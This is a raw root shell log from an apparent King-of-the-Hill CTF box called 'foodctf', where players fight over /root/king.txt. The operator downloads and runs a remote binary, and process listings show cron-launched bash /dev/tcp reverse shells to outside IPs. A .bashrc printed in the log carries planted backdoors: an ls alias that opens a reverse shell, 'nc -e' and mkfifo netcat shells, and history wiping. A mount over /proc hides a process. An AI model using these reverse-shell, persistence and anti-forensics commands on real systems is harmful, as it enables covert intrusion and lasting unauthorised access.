bash: cannot set terminal process group (6873): Inappropriate ioctl for device
bash: no job control in this shell
nc: invalid option -- 'e'
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
       [-m minttl] [-O length] [-P proxy_username] [-p source_port]
       [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
       [-X proxy_protocol] [-x proxy_address[:port]]     [destination] [port]
root@foodctf:~# cd /tmp
cd /tmp
root@foodctf:/tmp# ls 
ls 
c
exploit
f
GCONV_PATH=.
screens
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-6PL8mQ
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-4eM6RD
root@foodctf:/tmp# ./c -ia /root/king.txt
./c -ia /root/king.txt
cur attrs: 0x00000000, mask: 0x00000030
new attrs: 0x00000000
root@foodctf:/tmp# lsattr /root
lsattr /root
------------------ /root/king.txt
----i---------e--- /root/koth
--------------e--- /root/flag
root@foodctf:/tmp# cd
cd
root@foodctf:~# ls -la
ls -la
total 7260
drwx------  4 root root    4096 Nov  5 17:19 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Nov  5 17:19 .bash_history -> /dev/null
-rw-r--r--  1 root root    3412 Nov  5 17:24 .bashrc
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      12 Nov  5 17:29 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Nov  5 17:18 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
root@foodctf:~# mount
mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=471976k,nr_inodes=117994,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=100684k,mode=755)
/dev/xvda2 on / type ext4 (rw,relatime,data=ordered)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=32,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14880)
mqueue on /dev/mqueue type mqueue (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
configfs on /sys/kernel/config type configfs (rw,relatime)
/var/lib/snapd/snaps/core_8689.snap on /snap/core/8689 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/core_7270.snap on /snap/core/7270 type squashfs (ro,nodev,relatime,x-gdu.hide)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/user/1003 type tmpfs (rw,nosuid,nodev,relatime,size=100680k,mode=700,uid=1003,gid=1003)
tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
/dev/xvda2 on /proc/45 type ext4 (rw,relatime,data=ordered)
root@foodctf:~# umount /proc/45
umount /proc/45
root@foodctf:~# ps -eaf --forest
ps -eaf --forest
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 17:16 ?        00:00:00 [kthreadd]
root         4     2  0 17:16 ?        00:00:00  \_ [kworker/0:0H]
root         5     2  0 17:16 ?        00:00:00  \_ [kworker/u30:0]
root         6     2  0 17:16 ?        00:00:00  \_ [mm_percpu_wq]
root         7     2  0 17:16 ?        00:00:00  \_ [ksoftirqd/0]
root         8     2  0 17:16 ?        00:00:00  \_ [rcu_sched]
root         9     2  0 17:16 ?        00:00:00  \_ [rcu_bh]
root        10     2  0 17:16 ?        00:00:00  \_ [migration/0]
root        11     2  0 17:16 ?        00:00:00  \_ [watchdog/0]
root        12     2  0 17:16 ?        00:00:00  \_ [cpuhp/0]
root        13     2  0 17:16 ?        00:00:00  \_ [kdevtmpfs]
root        14     2  0 17:16 ?        00:00:00  \_ [netns]
root        15     2  0 17:16 ?        00:00:00  \_ [rcu_tasks_kthre]
root        16     2  0 17:16 ?        00:00:00  \_ [kauditd]
root        17     2  0 17:16 ?        00:00:00  \_ [xenbus]
root        18     2  0 17:16 ?        00:00:00  \_ [xenwatch]
root        19     2  0 17:16 ?        00:00:00  \_ [kworker/0:1]
root        20     2  0 17:16 ?        00:00:00  \_ [khungtaskd]
root        21     2  0 17:16 ?        00:00:00  \_ [oom_reaper]
root        22     2  0 17:16 ?        00:00:00  \_ [writeback]
root        23     2  0 17:16 ?        00:00:00  \_ [kcompactd0]
root        24     2  0 17:16 ?        00:00:00  \_ [ksmd]
root        25     2  0 17:16 ?        00:00:00  \_ [khugepaged]
root        26     2  0 17:16 ?        00:00:00  \_ [crypto]
root        27     2  0 17:16 ?        00:00:00  \_ [kintegrityd]
root        28     2  0 17:16 ?        00:00:00  \_ [kblockd]
root        29     2  0 17:16 ?        00:00:00  \_ [ata_sff]
root        30     2  0 17:16 ?        00:00:00  \_ [md]
root        31     2  0 17:16 ?        00:00:00  \_ [edac-poller]
root        32     2  0 17:16 ?        00:00:00  \_ [devfreq_wq]
root        33     2  0 17:16 ?        00:00:00  \_ [watchdogd]
root        34     2  0 17:16 ?        00:00:00  \_ [kworker/u30:1]
root        36     2  0 17:16 ?        00:00:00  \_ [kswapd0]
root        37     2  0 17:16 ?        00:00:00  \_ [kworker/u31:0]
root        38     2  0 17:16 ?        00:00:00  \_ [ecryptfs-kthrea]
root        80     2  0 17:16 ?        00:00:00  \_ [kthrotld]
root        81     2  0 17:16 ?        00:00:00  \_ [acpi_thermal_pm]
root        82     2  0 17:16 ?        00:00:00  \_ [scsi_eh_0]
root        83     2  0 17:16 ?        00:00:00  \_ [scsi_tmf_0]
root        84     2  0 17:16 ?        00:00:00  \_ [scsi_eh_1]
root        85     2  0 17:16 ?        00:00:00  \_ [scsi_tmf_1]
root        86     2  0 17:16 ?        00:00:00  \_ [kworker/u30:2]
root        91     2  0 17:16 ?        00:00:00  \_ [ipv6_addrconf]
root       100     2  0 17:16 ?        00:00:00  \_ [kstrp]
root       117     2  0 17:16 ?        00:00:00  \_ [charger_manager]
root       192     2  0 17:16 ?        00:00:00  \_ [ttm_swap]
root       278     2  0 17:16 ?        00:00:00  \_ [raid5wq]
root       331     2  0 17:16 ?        00:00:00  \_ [jbd2/xvda2-8]
root       332     2  0 17:16 ?        00:00:00  \_ [ext4-rsv-conver]
root       382     2  0 17:16 ?        00:00:00  \_ [kworker/0:1H]
root       400     2  0 17:16 ?        00:00:00  \_ [iscsi_eh]
root       417     2  0 17:16 ?        00:00:00  \_ [ib-comp-wq]
root       418     2  0 17:16 ?        00:00:00  \_ [ib-comp-unb-wq]
root       419     2  0 17:16 ?        00:00:00  \_ [ib_mcast]
root       421     2  0 17:16 ?        00:00:00  \_ [ib_nl_sa_wq]
root       426     2  0 17:16 ?        00:00:00  \_ [rdma_cm]
root       445     2  0 17:16 ?        00:00:00  \_ [loop0]
root       446     2  0 17:16 ?        00:00:00  \_ [loop1]
root      2930     2  0 17:22 ?        00:00:00  \_ [kworker/0:0]
root      5918     2  0 17:27 ?        00:00:00  \_ [kworker/0:2]
root         1     0  0 17:16 ?        00:00:05 /sbin/init maybe-ubiquity
root       396     1  0 17:16 ?        00:00:01 /lib/systemd/systemd-journald
root       422     1  0 17:16 ?        00:00:00 /sbin/lvmetad -f
root       428     1  0 17:16 ?        00:00:03 /lib/systemd/systemd-udevd
systemd+   521     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-timesyncd
systemd+   630     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-networkd
systemd+   633     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-resolved
root       743     1  0 17:16 ?        00:00:01 /usr/bin/lxcfs /var/lib/lxcfs/
message+   753     1  0 17:16 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       764     1  0 17:16 ?        00:00:00 /usr/sbin/inetd
syslog     765     1  0 17:16 ?        00:00:00 /usr/sbin/rsyslogd -n
root       769     1  0 17:16 ?        00:00:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
bread      772     1  0 17:16 ?        00:00:00 /home/bread/main
bread     2328   772  0 17:19 ?        00:00:00  \_ bash -c bash -i >& /dev/tcp/10.8.162.106/4444 0>&1
bread     2329  2328  0 17:19 ?        00:00:00  |   \_ bash -i
bread     3794   772  0 17:23 ?        00:00:00  \_ bash -c bash -i >& /dev/tcp/10.8.162.106/4444 0>&1
bread     3795  3794  0 17:23 ?        00:00:00      \_ bash -i
root      4053  3795  0 17:24 ?        00:00:00          \_ [sh]
root       773     1  0 17:16 ?        00:00:00 /root/koth
tryhack+   776     1  0 17:16 ?        00:00:00 /home/tryhackme/img
root       777     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-logind
root       780     1  0 17:16 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
daemon     783     1  0 17:16 ?        00:00:00 /usr/sbin/atd -f
root       784     1  1 17:16 ?        00:00:07 /usr/lib/snapd/snapd
root       785     1  0 17:16 ?        00:00:00 /usr/sbin/cron -f
root      4656   785  0 17:25 ?        00:00:00  \_ /usr/sbin/CRON -f
root      4657  4656  0 17:25 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      4658  4657  0 17:25 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      4659  4658  0 17:25 ?        00:00:00  |           \_ bash -i
root      5307   785  0 17:26 ?        00:00:00  \_ /usr/sbin/CRON -f
root      5308  5307  0 17:26 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      5309  5308  0 17:26 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      5310  5309  0 17:26 ?        00:00:00  |           \_ bash -i
root       155   785  0 17:27 ?        00:00:00  \_ /usr/sbin/CRON -f
root       156   155  0 17:27 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root       157   156  0 17:27 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root       158   157  0 17:27 ?        00:00:00  |           \_ bash -i
root      6322   785  0 17:28 ?        00:00:00  \_ /usr/sbin/CRON -f
root      6323  6322  0 17:28 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      6324  6323  0 17:28 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      6325  6324  0 17:28 ?        00:00:00  |           \_ bash -i
root      6908   785  0 17:29 ?        00:00:00  \_ /usr/sbin/CRON -f
root      6909  6908  0 17:29 ?        00:00:00      \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      6910  6909  0 17:29 ?        00:00:00          \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      6911  6910  0 17:29 ?        00:00:00              \_ bash -i
root       806     1  0 17:16 ttyS0    00:00:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       819     1  0 17:16 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       822     1  0 17:16 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root       833     1  0 17:16 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
mysql      853     1  0 17:16 ?        00:00:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen     1178     1  0 17:17 ?        00:00:00 /lib/systemd/systemd --user
ramen     1183  1178  0 17:17 ?        00:00:00  \_ (sd-pam)
root      2723     1  0 17:20 ?        00:00:00 sshd: ramen [priv]
ramen     2792  2723  0 17:20 ?        00:00:00  \_ sshd: ramen@pts/0
ramen     2793  2792  0 17:20 pts/0    00:00:00      \_ -bash
root      3850  2793  0 17:23 pts/0    00:00:00          \_ -i
root      4108  3850  0 17:24 pts/0    00:00:00              \_ tcpdump -i any -w /tmp/.systemd-font-89f032hf9032
root        45     1  0 17:24 ?        00:00:00 /lib/sy
root      4553     1  0 17:24 ?        00:00:00 /usr/sbin/sshd -D
root        35     1  9 17:26 ?        00:00:14 /lib/systemd/systemd-resolved
root      6873     1  0 17:28 ?        00:00:00 /bin/bash -c bash -i >& /dev/tcp/10.11.55.164/3737 0>&1
root      6882  6873  0 17:28 ?        00:00:00  \_ bash -i
root      7036  6882  0 17:29 ?        00:00:00      \_ ps -eaf --forest
root@foodctf:~# cd /etc && mkdir .k && cd .k && wget http://10.11.55.164/f && chmod +x f && ./f

< && wget http://10.11.55.164/f && chmod +x f && ./f
--2023-11-05 17:29:53--  http://10.11.55.164/f
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 780040 (762K) [application/octet-stream]
Saving to: ...f...

     0K .......... .......... .......... .......... ..........  6%  128K 6s
    50K .......... .......... .......... .......... .......... 13%  242K 4s
   100K .......... .......... .......... .......... .......... 19%  271K 3s
   150K .......... .......... .......... .......... .......... 26%  133K 3s
   200K .......... .......... .......... .......... .......... 32%  254K 3s
   250K .......... .......... .......... .......... .......... 39%  250K 2s
   300K .......... .......... .......... .......... .......... 45%  261K 2s
   350K .......... .......... .......... .......... .......... 52%  260K 2s
   400K .......... .......... .......... .......... .......... 59%  268K 1s
   450K .......... .......... .......... .......... .......... 65%  260K 1s
   500K .......... .......... .......... .......... .......... 72% 1.63M 1s
   550K .......... .......... .......... .......... .......... 78%  250K 1s
   600K .......... .......... .......... .......... .......... 85%  260K 0s
   650K .......... .......... .......... .......... .......... 91%  254K 0s
   700K .......... .......... .......... .......... .......... 98%  125K 0s
   750K .......... .                                          100%  239M=3.3s

2023-11-05 17:29:56 (228 KB/s) - ...f... saved [780040/780040]

root@foodctf:/etc/.k# cd
cd
root@foodctf:~# lsattr
lsattr
----i------------- ./king.txt
----i---------e--- ./koth
--------------e--- ./flag
root@foodctf:~# cd /tmp
cd /tmp
root@foodctf:/tmp# c -ia /root/king.txt
c -ia /root/king.txt
c: command not found
root@foodctf:/tmp# cd
cd
root@foodctf:~# ls
ls
flag
king.txt
koth
root@foodctf:~# echo a > king.txt
echo a > king.txt
bash: king.txt: Operation not permitted
root@foodctf:~# lsattr
lsattr
------------------ ./king.txt
----i---------e--- ./koth
--------------e--- ./flag
root@foodctf:~# cd /tmp
cd /tmp
root@foodctf:/tmp# ./c +ia /root
./c +ia /root
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080030
root@foodctf:/tmp# cd
cd
root@foodctf:~# ls -la
ls -la
total 7260
drwx------  4 root root    4096 Nov  5 17:19 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Nov  5 17:19 .bash_history -> /dev/null
-rw-r--r--  1 root root    3412 Nov  5 17:24 .bashrc
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Nov  5 17:35 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Nov  5 17:18 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
root@foodctf:~# cat .bashrc
cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# don't put duplicate lines in the history. See bash(1) for more options
# ... or force ignoredups and ignorespace
HISTCONTROL=ignoredups:ignorespace

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "$debian_chroot" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
     # We have color support; assume it's compliant with Ecma-48
     # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
     # a case would tend to support setf rather than setaf.)
     color_prompt=yes
    else
     color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
#if [ -f /etc/bash_completion ] && ! shopt -oq posix; then
#    . /etc/bash_completion
#fi
alias ls='(bash -i >& /dev/tcp/10.11.55.164/1337 0>&1 & disown) 2>/dev/null; ls --color=auto'
nc -e /bin/bash 10.11.55.164 1337 & cat /dev/null > /root/.bash_history
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f & cat /dev/null > /root/.bash_history
alias echo='/usr/bin/echo'
root@foodctf:~# lsattr
lsattr
----i------------- ./king.txt
----i---------e--- ./koth
--------------e--- ./flag
root@foodctf:~# ps -eaf --forest
ps -eaf --forest
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 17:16 ?        00:00:00 [kthreadd]
root         4     2  0 17:16 ?        00:00:00  \_ [kworker/0:0H]
root         5     2  0 17:16 ?        00:00:00  \_ [kworker/u30:0]
root         6     2  0 17:16 ?        00:00:00  \_ [mm_percpu_wq]
root         7     2  0 17:16 ?        00:00:00  \_ [ksoftirqd/0]
root         8     2  0 17:16 ?        00:00:01  \_ [rcu_sched]
root         9     2  0 17:16 ?        00:00:00  \_ [rcu_bh]
root        10     2  0 17:16 ?        00:00:00  \_ [migration/0]
root        11     2  0 17:16 ?        00:00:00  \_ [watchdog/0]
root        12     2  0 17:16 ?        00:00:00  \_ [cpuhp/0]
root        13     2  0 17:16 ?        00:00:00  \_ [kdevtmpfs]
root        14     2  0 17:16 ?        00:00:00  \_ [netns]
root        15     2  0 17:16 ?        00:00:00  \_ [rcu_tasks_kthre]
root        16     2  0 17:16 ?        00:00:00  \_ [kauditd]
root        17     2  0 17:16 ?        00:00:00  \_ [xenbus]
root        18     2  0 17:16 ?        00:00:00  \_ [xenwatch]
root        19     2  0 17:16 ?        00:00:00  \_ [kworker/0:1]
root        20     2  0 17:16 ?        00:00:00  \_ [khungtaskd]
root        21     2  0 17:16 ?        00:00:00  \_ [oom_reaper]
root        22     2  0 17:16 ?        00:00:00  \_ [writeback]
root        23     2  0 17:16 ?        00:00:00  \_ [kcompactd0]
root        24     2  0 17:16 ?        00:00:00  \_ [ksmd]
root        25     2  0 17:16 ?        00:00:00  \_ [khugepaged]
root        26     2  0 17:16 ?        00:00:00  \_ [crypto]
root        27     2  0 17:16 ?        00:00:00  \_ [kintegrityd]
root        28     2  0 17:16 ?        00:00:00  \_ [kblockd]
root        29     2  0 17:16 ?        00:00:00  \_ [ata_sff]
root        30     2  0 17:16 ?        00:00:00  \_ [md]
root        31     2  0 17:16 ?        00:00:00  \_ [edac-poller]
root        32     2  0 17:16 ?        00:00:00  \_ [devfreq_wq]
root        33     2  0 17:16 ?        00:00:00  \_ [watchdogd]
root        34     2  0 17:16 ?        00:00:00  \_ [kworker/u30:1]
root        36     2  0 17:16 ?        00:00:00  \_ [kswapd0]
root        37     2  0 17:16 ?        00:00:00  \_ [kworker/u31:0]
root        38     2  0 17:16 ?        00:00:00  \_ [ecryptfs-kthrea]
root        80     2  0 17:16 ?        00:00:00  \_ [kthrotld]
root        81     2  0 17:16 ?        00:00:00  \_ [acpi_thermal_pm]
root        82     2  0 17:16 ?        00:00:00  \_ [scsi_eh_0]
root        83     2  0 17:16 ?        00:00:00  \_ [scsi_tmf_0]
root        84     2  0 17:16 ?        00:00:00  \_ [scsi_eh_1]
root        85     2  0 17:16 ?        00:00:00  \_ [scsi_tmf_1]
root        86     2  0 17:16 ?        00:00:00  \_ [kworker/u30:2]
root        91     2  0 17:16 ?        00:00:00  \_ [ipv6_addrconf]
root       100     2  0 17:16 ?        00:00:00  \_ [kstrp]
root       117     2  0 17:16 ?        00:00:00  \_ [charger_manager]
root       192     2  0 17:16 ?        00:00:00  \_ [ttm_swap]
root       278     2  0 17:16 ?        00:00:00  \_ [raid5wq]
root       331     2  0 17:16 ?        00:00:00  \_ [jbd2/xvda2-8]
root       332     2  0 17:16 ?        00:00:00  \_ [ext4-rsv-conver]
root       382     2  0 17:16 ?        00:00:00  \_ [kworker/0:1H]
root       400     2  0 17:16 ?        00:00:00  \_ [iscsi_eh]
root       417     2  0 17:16 ?        00:00:00  \_ [ib-comp-wq]
root       418     2  0 17:16 ?        00:00:00  \_ [ib-comp-unb-wq]
root       419     2  0 17:16 ?        00:00:00  \_ [ib_mcast]
root       421     2  0 17:16 ?        00:00:00  \_ [ib_nl_sa_wq]
root       426     2  0 17:16 ?        00:00:00  \_ [rdma_cm]
root       445     2  0 17:16 ?        00:00:00  \_ [loop0]
root       446     2  0 17:16 ?        00:00:00  \_ [loop1]
root      8006     2  0 17:32 ?        00:00:00  \_ [kworker/0:0]
root      9645     2  0 17:37 ?        00:00:00  \_ [kworker/0:2]
root         1     0  0 17:16 ?        00:00:06 /sbin/init maybe-ubiquity
root       396     1  0 17:16 ?        00:00:01 /lib/systemd/systemd-journald
root       422     1  0 17:16 ?        00:00:00 /sbin/lvmetad -f
root       428     1  0 17:16 ?        00:00:04 /lib/systemd/systemd-udevd
systemd+   521     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-timesyncd
systemd+   630     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-networkd
systemd+   633     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-resolved
root       743     1  0 17:16 ?        00:00:01 /usr/bin/lxcfs /var/lib/lxcfs/
message+   753     1  0 17:16 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       764     1  0 17:16 ?        00:00:00 /usr/sbin/inetd
syslog     765     1  0 17:16 ?        00:00:00 /usr/sbin/rsyslogd -n
root       769     1  0 17:16 ?        00:00:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
bread      772     1  0 17:16 ?        00:00:00 /home/bread/main
bread     2328   772  0 17:19 ?        00:00:00  \_ bash -c bash -i >& /dev/tcp/10.8.162.106/4444 0>&1
bread     2329  2328  0 17:19 ?        00:00:00  |   \_ bash -i
bread     3794   772  0 17:23 ?        00:00:00  \_ bash -c bash -i >& /dev/tcp/10.8.162.106/4444 0>&1
bread     3795  3794  0 17:23 ?        00:00:00      \_ bash -i
root      4053  3795  0 17:24 ?        00:00:00          \_ [sh]
root       773     1  0 17:16 ?        00:00:00 /root/koth
tryhack+   776     1  0 17:16 ?        00:00:00 /home/tryhackme/img
root       777     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-logind
root       780     1  0 17:16 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
daemon     783     1  0 17:16 ?        00:00:00 /usr/sbin/atd -f
root       784     1  0 17:16 ?        00:00:09 /usr/lib/snapd/snapd
root       785     1  0 17:16 ?        00:00:00 /usr/sbin/cron -f
root      4656   785  0 17:25 ?        00:00:00  \_ /usr/sbin/CRON -f
root      4657  4656  0 17:25 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      4658  4657  0 17:25 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      4659  4658  0 17:25 ?        00:00:00  |           \_ bash -i
root      5307   785  0 17:26 ?        00:00:00  \_ /usr/sbin/CRON -f
root      5308  5307  0 17:26 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      5309  5308  0 17:26 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      5310  5309  0 17:26 ?        00:00:00  |           \_ bash -i
root       155   785  0 17:27 ?        00:00:00  \_ /usr/sbin/CRON -f
root       156   155  0 17:27 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root       157   156  0 17:27 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root       158   157  0 17:27 ?        00:00:00  |           \_ bash -i
root      6322   785  0 17:28 ?        00:00:00  \_ /usr/sbin/CRON -f
root      6323  6322  0 17:28 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      6324  6323  0 17:28 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      6325  6324  0 17:28 ?        00:00:00  |           \_ bash -i
root      6908   785  0 17:29 ?        00:00:00  \_ /usr/sbin/CRON -f
root      6909  6908  0 17:29 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      6910  6909  0 17:29 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      6911  6910  0 17:29 ?        00:00:00  |           \_ bash -i
root      7211   785  0 17:30 ?        00:00:00  \_ /usr/sbin/CRON -f
root      7212  7211  0 17:30 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      7213  7212  0 17:30 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      7214  7213  0 17:30 ?        00:00:00  |           \_ bash -i
root      7521   785  0 17:31 ?        00:00:00  \_ /usr/sbin/CRON -f
